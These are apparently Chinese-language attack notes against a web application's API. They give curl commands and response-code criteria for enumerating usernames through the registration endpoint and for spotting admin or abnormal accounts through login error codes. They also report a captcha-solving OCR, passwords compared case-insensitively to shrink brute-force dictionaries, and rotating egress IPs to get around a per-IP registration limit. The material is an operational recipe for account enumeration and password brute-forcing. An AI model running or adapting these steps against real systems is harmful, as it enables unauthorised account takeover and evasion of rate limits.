# 前置：验证码 GET /code.php（60x30 PNG，4 位纯数字、无干扰、一次有效）
#         已实现模板匹配 OCR，准确率 100%（见工作目录 runs/ocr2.py）

# ---- 1) 用户名存在性枚举（注册接口）----
# 判据：
#   code 210 / 212 -> 该用户已经存在  ★命中
#   code 200 + result.uid -> 注册成功（用户名不存在）
#   code 218 -> 用户名长度短于 3 位（本测试无效，换更长的名字）
#   code 209 -> 验证码错误（重新取码重试，不是否定结论）
curl -s -k -H "Host: TARGET_DOMAIN" -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST -d "action=reg&userid=USERID&passwd=Aa112233&passwd1=Aa112233&safe=CAPTCHA" http://TARGET_IP/api/

# 实测样例：userid=test -> {"code":212}（存在）；userid=5799 -> {"code":200,"result":{"uid":"..."}}（不存在）

# ---- 2) 登录接口对"存在但状态异常"的账号返回特异码 ----
#   code 100 -> 账密错误（不存在 / 密码错，无法区分）
#   code 213 -> 该账号状态异常（账号真实存在且非正常态）★可用于发现管理员/特殊账号
#   code 200 + result.uid -> 登录成功
curl -s -k -H "Host: TARGET_DOMAIN" -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST -d "action=login&userid=admin&passwd=123456&safe=CAPTCHA" http://TARGET_IP/api/

# ---- 3) 口令大小写不敏感（爆破字典全部用小写）----
# 实测：同一账号用 XY9ZQ7MM! / xy9zq7mm! / Xy9Zq7Mm! 三种写法均登录成功
# 结合后台 root_set 回显的 passwd=md5(小写明文)，可确认后端统一小写比较
# 结论：字典只需小写形式，有效搜索空间显著缩小

# ---- 4) 注意配额 ----
# reg 接口限制"同一 IP 一天只能注册 10 个帐号"（code 211），批量枚举需要换出口